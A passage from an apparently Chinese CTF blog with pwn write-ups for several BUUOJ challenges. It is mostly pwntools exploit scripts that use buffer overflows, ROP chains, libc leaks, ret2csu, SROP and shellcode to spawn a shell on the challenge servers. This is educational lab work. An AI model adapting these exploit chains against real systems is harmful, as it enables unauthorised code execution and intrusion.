class="hljs-comment">#---------begin--------#</span><br>dbg()<br><br>ru(<span class="hljs-string">b&quot;What&#x27;s your name?\n&quot;</span>)<br><br>payload = shell_code + <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x24</span>-<span class="hljs-built_in">len</span>(shell_code)) + p32(jmp_esp) + sub_esp_jmp<br>sl(payload)<br>ia()<br></code></pre></td></tr></table></figure><p>rop，加了一些限制条件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:25006&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> x, a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>pop_ebx_ret = <span class="hljs-number">0x0804840d</span><br>win1 = <span class="hljs-number">0x080485CB</span><br>win2 = <span class="hljs-number">0x080485D8</span><br>flag = <span class="hljs-number">0x0804862B</span><br><span class="hljs-comment"># dbg(&quot;&quot;&quot;</span><br><span class="hljs-comment">#     b flag</span><br><span class="hljs-comment"># &quot;&quot;&quot;)</span><br>ru(<span class="hljs-string">b&#x27;Enter your input&gt; &#x27;</span>)<br>payload = p32(<span class="hljs-number">0xDEADBAAD</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x1c</span> - <span class="hljs-number">0x5</span>) + p32(win1) + p32(win2) + p32(pop_ebx_ret) + p32(<span class="hljs-number">0xBAAAAAAD</span>) + p32(flag) +p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0xDEADBAAD</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>sl(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><p>首先要想办法绕过<code>atoi</code>从而能够实现<code>ROP</code>。有一个函数<code>dosomething</code>里面有<code>int 0x80</code>系统调用，想办法用这个函数得到<code>shell</code>。emmm做的时候最终没选择这样，ROP <code>system(&#39;/bin/sh&#39;)</code>得到的shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:27531&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)<br>pop_ebx_ret = <span class="hljs-number">0x0804840d</span><br>win1 = <span class="hljs-number">0x080485CB</span><br>win2 = <span class="hljs-number">0x080485D8</span><br>flag = <span class="hljs-number">0x0804862B</span><br><span class="hljs-comment"># dbg(&quot;&quot;&quot;</span><br><span class="hljs-comment">#     b vuln</span><br><span class="hljs-comment"># &quot;&quot;&quot;)</span><br>ru(<span class="hljs-string">b&#x27;How many bytes do you want me to read? &#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;data!\n&#x27;</span>)<br><span class="hljs-comment"># get return addr</span><br><br>str1 = <span class="hljs-number">0x080486F8</span><br>vuln = <span class="hljs-number">0x0804852F</span><br>printf = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>getchar_got = elf.got[<span class="hljs-string">&#x27;getchar&#x27;</span>]<br>atoi_got = elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>pop_2_ret = <span class="hljs-number">0x0804864e</span><br><span class="hljs-comment"># leak address of libc by printf</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x2c</span> + <span class="hljs-number">0x4</span> - <span class="hljs-number">0x1</span>) + <span class="hljs-string">b&#x27;b&#x27;</span><br>payload += p32(printf) + p32(vuln) + p32(str1) + p32(printf_got)<br>sl(payload)<br>rl()<br>ru(<span class="hljs-string">b&#x27;You said: &#x27;</span>)<br>printf_addr = u32(rv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;printf_Addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(printf_addr)&#125;</span>&quot;</span>)<br>obj = LibcSearcher(<span class="hljs-string">&quot;printf&quot;</span>, printf_addr)<br><span class="hljs-comment"># libc_addr = getchar_addr - libc.sym[&#x27;atoi&#x27;]</span><br>libc_addr = printf_addr - obj.dump(<span class="hljs-string">&#x27;printf&#x27;</span>)<br><br>system = libc_addr + obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libc_addr + obj.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-comment"># system = libc_addr + libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-comment"># bin_sh = libc_addr + next(libc.search(&#x27;/bin/sh\x00&#x27;))</span><br><br><span class="hljs-comment"># system(&#x27;/bin/sh&#x27;)</span><br>ru(<span class="hljs-string">b&#x27;How many bytes do you want me to read? &#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;data!\n&#x27;</span>)<br><span class="hljs-comment"># get return addr</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x30</span> + p32(system) + p32(vuln) + p32(bin_sh)<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>因为一直没找到<code>libc</code>，远程打不通，本地还是很好打的</p><h1 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h1><p>32位，只开启 NX enable<br><img src="/images/20250827151704.png"><br>只能溢出8字节，后门函数为<code>shell</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;Linux&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="hljs-number">29329</span>)<br>p.recvline()<br>p.recvline()<br>p.recvline()<br>p.recvline()<br>shell = <span class="hljs-number">0x0804851B</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1c</span> + p32(shell)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-level3"><a href="#jarvisoj-level3" class="headerlink" title="jarvisoj_level3"></a>jarvisoj_level3</h1><p>也是简单的ROP，只开启了NX enable<br>直接打</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.update(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;Linux&#x27;</span>)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="hljs-number">27777</span>)<br><br>elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main = <span class="hljs-number">0x08048484</span><br><span class="hljs-comment">#------leak libc addr------#</span><br>payload = (<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(write_plt) + p32(main) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Input:\n&#x27;</span>)<br>p.sendline(payload)<br>write = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;write_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(write)&#125;</span>&quot;</span>)<br>obj = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>, write)<br>libc = write - obj.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system = libc + obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh = libc + obj.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Input:\n&#x27;</span>)<br>payload = (<span class="hljs-number">0x88</span> + <span class="hljs-number">0x4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(system) + p32(main) + p32(bin_sh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>64位，只开启了NX保护</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><p><img src="/images/20250828091840.png"><br><code>call function_addr</code> 会将下一条指令压栈，然后跳转到函数地址开始执行。我这里传入了<code>ret</code>，所以最终栈的结构不变，也不会影响ROP链。<br><img src="/images/20250828092130.png"><br>下图是执行完<code>call qword ptr [r12]</code>的结果<br><img src="/images/20250828091932.png"><br>这个题目是近期做的相对比较麻烦的，利用思路比较简单，但有一些细节需要注意，中间遇到了几个点：</p><ol><li>ret2csu之后，对参数设置，由于是<code>mov edi, r15d</code>，所以其实<code>/bin/sh</code>的地址在这个时候是传不过来的，需要在后面再次传一下。</li><li><code>call qword pttr [r12 + rbp*8]</code>这一步，r12存的是一个函数的中间地址。<code>call</code>是将地址压栈，然后跳转到函数地址开始执行。这里选择了直接传了一个<code>ret</code>，可以让栈上结构不变，然后接着ROP后面的过程。</li><li>需要向栈内手动写入<code>/bin/sh</code>，并且通过泄露栈的地址来计算<code>/bin/sh</code>的地址达到目的。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># Local = True </span><br>Local = <span class="hljs-literal">False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:25639&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc_start_main = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><br><span class="hljs-comment"># dbg(&#x27;b vuln&#x27;)</span><br><br>pop_addr = <span class="hljs-number">0x40059A</span><br>arg_set = <span class="hljs-number">0x400580</span><br>sys_call = <span class="hljs-number">0x400517</span><br>execve = <span class="hljs-number">0x4004E2</span><br>vuln = <span class="hljs-number">0x4004ED</span><br>ret = <span class="hljs-number">0x4003a9</span><br>pop_rdi = <span class="hljs-number">0x4005a3</span><br><span class="hljs-comment"># write /bin/sh into stack</span><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(ret) + (<span class="hljs-number">0x10</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) - <span class="hljs-number">0x8</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(vuln)<br><br><span class="hljs-comment"># get the address of &#x27;/bin/sh&#x27;</span><br>sl(payload)<br><br>rv(<span class="hljs-number">0x20</span>)<br>old_ebp = u64(rv(<span class="hljs-number">6</span>).strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;old_ebp: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(old_ebp)&#125;</span>&quot;</span>)<br>buf =  <span class="hljs-number">0x7ffc783316d0</span><br>ebp = <span class="hljs-number">0x7ffc7833321b</span><br>bin_sh = old_ebp + buf - ebp<br>bin_sh = old_ebp - <span class="hljs-number">0x118</span><br>ret_addr = bin_sh + <span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;bin_sh: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(bin_sh)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#execve(&#x27;/bin/sh&#x27;, 0, 0) pop_rdi_esi_rdx ret</span><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(ret) + (<span class="hljs-number">0x10</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) - <span class="hljs-number">0x8</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(execve) + p64(pop_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(ret_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(bin_sh) + p64(arg_set) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(pop_rdi) + p64(bin_sh) + p64(sys_call)<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>解法2：</p><p>在网上看到一些 Sigreturn Oriented Programming攻击 的方式解本题。将[[|SROP]]的相关内容在<a href="https://www.anquanke.com/post/id/85810">这篇文章</a>了</p><p>用这样的方法可以直接设置寄存器的值从而调用任意的系统调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>Local = <span class="hljs-literal">True</span> <br><span class="hljs-comment"># Local = False</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;split-window&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;70&quot;</span>]<br>url = <span class="hljs-string">&quot;node5.buuoj.cn:25639&quot;</span><br><br>HOST, POST = url.split(<span class="hljs-string">&quot;:&quot;</span>)<br>POST = <span class="hljs-built_in">int</span>(POST)<br><br><span class="hljs-keyword">if</span> Local:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = remote(HOST, POST)<br><br>rl = <span class="hljs-keyword">lambda</span> a=<span class="hljs-literal">False</span>: p.recvline(a)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(<span class="hljs-built_in">bytes</span>(x))<br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br>ia = <span class="hljs-keyword">lambda</span>: p.interactive()<br>dbg = <span class="hljs-keyword">lambda</span> text = <span class="hljs-string">&#x27;&#x27;</span>: gdb.attach(p, text)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc_start_main = elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><span class="hljs-comment"># dbg(&#x27;b vuln&#x27;)</span><br>sys_call = <span class="hljs-number">0x400501</span> <br>syscall = <span class="hljs-number">0x4004D6</span><br>vuln = <span class="hljs-number">0x4004ED</span><br><span class="hljs-comment"># write /bin/sh into stack</span><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(ret) + (<span class="hljs-number">0x10</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) - <span class="hljs-number">0x8</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(vuln)<br><br><span class="hljs-comment"># get the address of &#x27;/bin/sh&#x27;</span><br>sl(payload)<br><br>rv(<span class="hljs-number">0x20</span>)<br>old_ebp = u64(rv(<span class="hljs-number">6</span>).strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;old_ebp: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(old_ebp)&#125;</span>&quot;</span>)<br>buf =  <span class="hljs-number">0x7ffc783316d0</span><br>ebp = <span class="hljs-number">0x7ffc7833321b</span><br>bin_sh = old_ebp + buf - ebp<br>bin_sh = old_ebp - <span class="hljs-number">0x118</span><br>ret_addr = bin_sh + <span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;bin_sh: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(bin_sh)&#125;</span>&quot;</span>)<br><br>signframe = SigreturnFrame(kernel=<span class="hljs-string">&#x27;i386&#x27;</span>)<br>signframe.rax = constants.SYS_execve<br>signframe.rdi = bin_sh<br>signframe.rsi = <span class="hljs-number">0</span><br>signframe.rdx = <span class="hljs-number">0</span><br>signframe.rip = sys_call<br><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(ret) + (<span class="hljs-number">0x10</span> - <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) - <span class="hljs-number">0x8</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(<span class="hljs-number">0x4004DA</span>) + p64(sys_call) + <span class="hljs-built_in">bytes</span>(signframe)<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h1><p><img src="/images/20250828114214.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 